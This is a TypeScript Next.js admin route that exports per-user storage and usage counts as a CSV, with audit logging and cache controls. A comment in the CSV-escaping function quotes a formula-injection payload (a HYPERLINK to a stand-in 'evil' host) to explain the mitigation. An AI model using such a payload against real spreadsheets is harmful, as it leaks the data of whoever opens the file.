import { sql } from "drizzle-orm";
import { headers as nextHeaders } from "next/headers";
import { NextResponse } from "next/server";
import { db } from "@/db";
import { logCsvExport } from "@/lib/admin/actions";
import { requireAdminMutation } from "@/lib/admin/guard";
import { clientIpFromHeaders } from "@/lib/admin/ip-allowlist";
import { AppError, apiHandler, ErrorCode } from "@/lib/errors";

/**
 * Per-user cost snapshot CSV. Includes email + storage + recording counts +
 * server-tx counts. Treated as a MUTATION-class action (requires the tighter
 * 10-minute elevated-cookie window) because it lifts bulk PII off the system
 * in a single download.
 *
 * POST + JSON body (`{ reason }`) so the audit reason never lands in URL
 * query string -- access logs / browser history / referer headers would
 * otherwise capture it. Logged to admin_action_log via logCsvExport.
 */
export const POST = apiHandler(async (request: Request) => {
    const admin = await requireAdminMutation({
        route: "/api/admin/pricing-snapshot/export.csv",
        method: "POST",
    });

    const parsed = await request.json().catch(() => null);
    const body =
        parsed && typeof parsed === "object"
            ? (parsed as Record<string, unknown>)
            : {};
    const reason = typeof body.reason === "string" ? body.reason : "";
    if (reason.trim().length < 4) {
        throw new AppError(
            ErrorCode.MISSING_REQUIRED_FIELD,
            "reason required (min 4 chars)",
            400,
            { field: "reason" },
        );
    }

    // Single round-trip: per-user storage, recording count, server-tx 30d.
    // We do not include the user_id (an opaque nanoid) -- email is the
    // operational handle. If you ever need user_id back, it should be a
    // separate, more strongly justified export.
    const rows = await db.execute<{
        email: string;
        created_at: Date;
        suspended_at: Date | null;
        recording_count: number;
        storage_bytes: number;
        server_tx_30d: number;
    }>(sql`
        with rec as (
            select user_id,
                   count(*)::int as n,
                   coalesce(sum(filesize), 0)::bigint as bytes
            from recordings
            where deleted_at is null
            group by user_id
        ),
        tx as (
            select user_id, count(*)::int as n
            from transcriptions
            where transcription_type = 'server'
              and created_at >= now() - interval '30 days'
            group by user_id
        )
        select u.email,
               u.created_at,
               u.suspended_at,
               coalesce(rec.n, 0)::int as recording_count,
               coalesce(rec.bytes, 0)::bigint as storage_bytes,
               coalesce(tx.n, 0)::int as server_tx_30d
        from users u
        left join rec on rec.user_id = u.id
        left join tx on tx.user_id = u.id
        order by storage_bytes desc nulls last
    `);

    await logCsvExport(
        {
            adminUserId: admin.user.id,
            adminUserEmail: admin.user.email,
            ip: clientIpFromHeaders(await nextHeaders()),
            reason,
        },
        "pricing_snapshot",
        rows.length,
    );

    const header = [
        "email",
        "created_at",
        "suspended",
        "recording_count",
        "storage_bytes",
        "server_tx_30d",
    ].join(",");

    const csvEscape = (v: unknown): string => {
        if (v === null || v === undefined) return "";
        let s = String(v);
        // CSV-injection defense: spreadsheet apps (Excel, Numbers, Sheets)
        // will evaluate cell contents as a formula when they start with one
        // of these characters. A user can register with an email like
        // `=HYPERLINK("http://evil/?"&A1)` which would then run as the
        // admin who opens the export. Prefix with a single apostrophe;
        // spreadsheets render the value as text without showing the quote.
        // OWASP "CSV injection" / formula-injection mitigation.
        if (/^[=+\-@\t\r]/.test(s)) {
            s = `'${s}`;
        }
        // CSV quoting: wrap in quotes if it contains comma/quote/newline.
        if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
        return s;
    };

    const lines = rows.map((r) =>
        [
            csvEscape(r.email),
            csvEscape(new Date(r.created_at).toISOString()),
            csvEscape(r.suspended_at ? "true" : "false"),
            csvEscape(r.recording_count),
            csvEscape(r.storage_bytes),
            csvEscape(r.server_tx_30d),
        ].join(","),
    );

    const csv = `${header}\n${lines.join("\n")}\n`;
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    return new NextResponse(csv, {
        headers: {
            "Content-Type": "text/csv; charset=utf-8",
            "Content-Disposition": `attachment; filename="riffado-pricing-snapshot-${stamp}.csv"`,
            // Don't let intermediaries cache PII.
            "Cache-Control": "no-store, private",
        },
    });
});
